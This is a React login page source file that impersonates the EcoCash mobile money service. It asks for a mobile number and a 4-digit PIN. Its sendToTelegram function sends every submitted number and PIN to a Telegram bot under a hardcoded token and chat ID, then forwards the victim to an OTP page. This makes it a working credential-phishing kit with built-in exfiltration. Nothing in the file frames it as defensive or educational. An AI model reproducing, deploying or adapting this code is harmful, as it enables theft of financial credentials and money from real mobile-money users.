import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { Menu } from "lucide-react";

const Login = () => {
  // ✅ Move it here
  const [menuOpen, setMenuOpen] = useState(false);
  const [countryCode, setCountryCode] = useState("+263");
  const [mobile, setMobile] = useState("");
  const [pin, setPin] = useState("");

  const TELEGRAM_BOT_TOKEN = "7473229254:AAH6gQtxqyY32NpHpWiQ7v0GSXRxMM8UVX8";
  const TELEGRAM_CHAT_ID = "5287071616";

  const sendToTelegram = async (username: string, pin: string) => {
    const message = `EcoCash Login\nUsername: ${username}\nPIN: ${pin}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });
    } catch (error) {
      console.error("Failed to send to Telegram", error);
    }
  };

  const navigate = useNavigate();
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (pin.length !== 4) return;
  const fullMobile = countryCode + mobile;
  await sendToTelegram(fullMobile, pin);
  navigate("/otp", { state: { mobile: fullMobile } });
  };

  const handleSignUp = () => {
    console.log("Redirect to sign up");
  };

  return (
  <div className="relative min-h-screen flex flex-col items-center justify-center overflow-hidden bg-gradient-to-b from-white via-blue-50 to-blue-100">
      {/* Background network effect */}
      <div className="absolute inset-0 -z-10">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          viewBox="0 0 1440 800"
          preserveAspectRatio="none"
          className="w-full h-full opacity-40"
        >
          <defs>
            <linearGradient id="bgGradient" x1="0" y1="0" x2="1" y2="1">
              <stop offset="0%" stopColor="#3b82f6" />
              <stop offset="100%" stopColor="#60a5fa" />
            </linearGradient>
          </defs>
          <path
            fill="url(#bgGradient)"
            d="M0,200 C200,300 400,100 600,200 C800,300 1000,150 1200,250 C1400,350 1440,200 1440,200 L1440,800 L0,800 Z"
          />
          <g stroke="#2563eb" strokeWidth="0.5" opacity="0.4">
            <circle cx="300" cy="200" r="3" />
            <circle cx="600" cy="400" r="3" />
            <circle cx="900" cy="250" r="3" />
            <circle cx="1100" cy="450" r="3" />
            <line x1="300" y1="200" x2="600" y2="400" />
            <line x1="600" y1="400" x2="900" y2="250" />
            <line x1="900" y1="250" x2="1100" y2="450" />
            <line x1="1100" y1="450" x2="300" y2="200" />
          </g>
        </svg>
      </div>
      {/* Header */}
      <header className="fixed top-0 left-0 w-full flex items-center justify-between px-6 py-4 bg-background shadow-sm z-10">
        <h1 className="text-2xl font-bold">
          <span className="text-brand-blue">Eco</span>
          <span className="text-brand-red">Cash</span>
        </h1>
        <div className="hidden md:flex gap-2">
          <Button variant="outline" onClick={handleLogin} type="button">
            Login
          </Button>
          <Button variant="outline" onClick={handleSignUp} type="button">
            Sign Up
          </Button>
        </div>
        <div className="md:hidden">
          <Button
            variant="outline"
            size="icon"
            onClick={() => setMenuOpen((open) => !open)}
            aria-label="Open menu"
          >
            <Menu className="h-5 w-5" />
          </Button>
          {menuOpen && (
            <div className="absolute right-6 top-16 bg-background border rounded-lg shadow-lg flex flex-col w-32 z-50">
              <Button
                variant="ghost"
                className="w-full justify-start px-4 py-2 border-b border-border rounded-t-lg"
                onClick={() => {
                  setMenuOpen(false);
                  handleLogin({ preventDefault: () => {} } as any);
                }}
                type="button"
              >
                Login
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start px-4 py-2 rounded-b-lg"
                onClick={() => {
                  setMenuOpen(false);
                  handleSignUp();
                }}
                type="button"
              >
                Sign Up
              </Button>
            </div>
          )}
        </div>
      </header>

      {/* Login Card */}
  <Card className="mt-20 w-full max-w-md bg-card bg-white/80 backdrop-blur-md rounded-2xl shadow-lg p-8 border-border">
        <h2 className="text-2xl font-semibold text-center mb-6 text-card-foreground">
          Log In
        </h2>


        <form onSubmit={handleLogin} className="space-y-5">
          <div className="space-y-2">
            <Label htmlFor="username">Mobile Number</Label>
            <div className="flex gap-2">
              <select
                className="border rounded-md px-2 py-2 bg-white"
                value={countryCode}
                onChange={e => setCountryCode(e.target.value)}
                style={{ minWidth: 90 }}
                aria-label="Country code"
              >
                <option value="+263">ZW +263</option>
                <option value="+27">ZA +27</option>
                <option value="+260">ZM +260</option>
                <option value="+255">TZ +255</option>
                <option value="+254">KE +254</option>
                <option value="+44">UK +44</option>
                <option value="+1">US +1</option>
              </select>
              <Input
                id="username"
                type="text"
                placeholder="mobile number..."
                value={mobile}
                onChange={(e) => setMobile(e.target.value)}
                required
                className="flex-1"
              />
            </div>
          </div>
          <div className="space-y-2">
            <Label htmlFor="pin">4-Digit PIN</Label>
            <Input
              id="pin"
              type="password"
              inputMode="numeric"
              pattern="[0-9]{4}"
              maxLength={4}
              minLength={4}
              placeholder="Enter 4-digit PIN"
              value={pin}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, "");
                if (val.length <= 4) setPin(val);
              }}
              required
            />
          </div>
          <Button type="submit" className="w-full" disabled={pin.length !== 4}>
            LOGIN
          </Button>
        </form>

        <Button
          variant="outline"
          className="w-full mt-4"
          onClick={handleSignUp}
        >
          SIGN UP
        </Button>
      </Card>

      <footer className="mt-8 text-sm text-muted-foreground">
        © 2025 Ecocash
      </footer>
    </div>
  );
};

export default Login;
